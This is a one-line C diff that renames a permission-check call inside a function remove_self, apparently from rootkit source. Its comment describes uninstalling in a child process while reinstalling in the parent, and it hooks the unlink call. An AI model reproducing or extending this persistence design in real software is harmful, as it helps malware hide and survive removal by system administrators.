@@ -1,6 +1,6 @@
 /* uninstall. continue execution in child. reinstall in parent. */
 int remove_self(void){
-    if(not_user(0))
+    if(notuser(0))
         return VINVALID_PERM;
 
     hook(CUNLINK);
